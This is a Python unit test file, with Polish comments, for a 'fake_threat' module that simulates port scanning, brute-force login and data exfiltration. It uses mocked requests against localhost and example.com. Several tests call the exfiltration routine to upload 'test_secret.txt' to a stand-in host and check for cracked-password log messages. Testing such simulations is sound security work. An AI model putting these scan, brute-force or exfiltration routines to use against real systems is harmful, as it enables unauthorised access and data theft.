# tests/test_fake_attack.py
import unittest
from unittest.mock import patch, MagicMock
import requests
#Poprawny import absolutny
from fake_threat import simulate_port_scan, simulate_brute_force_login, simulate_data_exfiltration, generate_random_string
import logging

# Wyłącz zbędne logi z biblioteki requests
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)


class TestFakeThreat(unittest.TestCase):

    @patch('requests.get')
    def test_simulate_port_scan_open_port(self, mock_get):
        """Testuje symulację skanowania portu, gdy port jest otwarty."""
        mock_response = MagicMock()
        mock_response.status_code = 200  # Symuluj otwarty port
        mock_get.return_value = mock_response

        with self.assertLogs(level='WARNING') as cm:
            simulate_port_scan('127.0.0.1', 80, 80) # BEZ fake_threat.
        self.assertIn("wydaje się być otwarty", cm.output[0])


    @patch('requests.get')
    def test_simulate_port_scan_closed_port(self, mock_get):
        """Testuje symulację skanowania, gdy port jest zamknięty."""
        mock_get.side_effect = requests.exceptions.ConnectionError("Connection refused")

        with self.assertLogs(level='DEBUG') as cm:
             simulate_port_scan('127.0.0.1', 80, 80) # BEZ fake_threat.
        self.assertIn("prawdopodobnie zamknięty", cm.output[0])

    @patch('requests.post')
    def test_simulate_brute_force_login_success(self, mock_post):
        """Testuje symulację ataku brute-force z poprawnym hasłem."""

        # Symuluj odpowiedź serwera wskazującą na udane logowanie
        mock_response = MagicMock()
        mock_response.text = "Zalogowano pomyślnie" #DOPASUJ DO RZECZYWISTEGO KOMUNIKATU
        mock_post.return_value = mock_response

        # Użyj pliku z hasłami w trybie testowym (umieść go w katalogu testów!)
        with self.assertLogs(level='CRITICAL') as cm:
            simulate_brute_force_login('http://example.com/login', 'admin', ['password']) # TESTOWY PLIK, i BEZ fake_threat.
        self.assertIn("Udało się złamać hasło!", cm.output[0])


    @patch('requests.post')
    def test_simulate_brute_force_login_failure(self, mock_post):
        """Testuje symulację brute-force z błędnymi hasłami."""
        mock_response = MagicMock()
        mock_response.text = "Nieprawidłowe hasło" #DOPASUJ DO RZECZYWISTEGO KOMUNIKATU
        mock_post.return_value = mock_response

        with self.assertLogs(level='INFO') as cm:
            simulate_brute_force_login('http://example.com/login', 'admin', ['wrong']) # BEZ fake_threat
        self.assertIn("Failed attempt with password", cm.output[0]) #Sprawdzaj poprawny komunikat


    @patch('requests.post')
    def test_simulate_brute_force_login_file_not_found(self, mock_post):
        """Testuje przypadek, gdy pliku z hasłami nie znaleziono"""

        with self.assertLogs(level='ERROR') as cm:
            simulate_brute_force_login('http://example.com/login', 'admin', 'nonexistent_file.txt') # BEZ fake_threat.
        self.assertIn("Password file not found", cm.output[0])


    @patch('requests.post')
    def test_simulate_data_exfiltration_success(self, mock_post):
        """Test symulacji eksfiltracji danych - sukces."""
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_post.return_value = mock_response

        with self.assertLogs(level='CRITICAL') as cm:
            simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt') #TESTOWY PLIK, i BEZ fake_threat.
        self.assertIn("File exfiltration of 'test_secret.txt' successful!", cm.output[0])

    @patch('requests.post')
    def test_simulate_data_exfiltration_failure(self, mock_post):
        """Test symulacji eksfiltracji danych - porażka."""
        mock_response = MagicMock()
        mock_response.status_code = 404  # Or any non-success code
        mock_post.return_value = mock_response
        with self.assertLogs(level='WARNING') as cm:
             simulate_data_exfiltration('http://example.com/upload', 'test_secret.txt') # BEZ fake_threat.
        self.assertIn("File exfiltration of 'test_secret.txt' failed", cm.output[0])

    @patch('requests.post')
    def test_simulate_data_exfiltration_file_not_found(self, mock_post):
        """Test eksfiltracji, gdy plik nie istnieje."""
        with self.assertLogs(level='ERROR') as cm:
            simulate_data_exfiltration('http://example.com/upload', 'nonexistent_file.txt') # BEZ fake_threat.
        self.assertIn("File to exfiltrate not found", cm.output[0])

    def test_generate_random_string(self):
        """Test generatora losowych ciągów"""
        result = generate_random_string()  # BEZ fake_threat.
        self.assertEqual(len(result), 10)  # Default length
        self.assertTrue(result.islower())

    def test_generate_random_string_custom_length(self):
        """Test generatora z określoną długością."""
        result = generate_random_string(length=5) # BEZ fake_threat.
        self.assertEqual(len(result), 5)
        self.assertTrue(result.islower())

if __name__ == '__main__':
    unittest.main()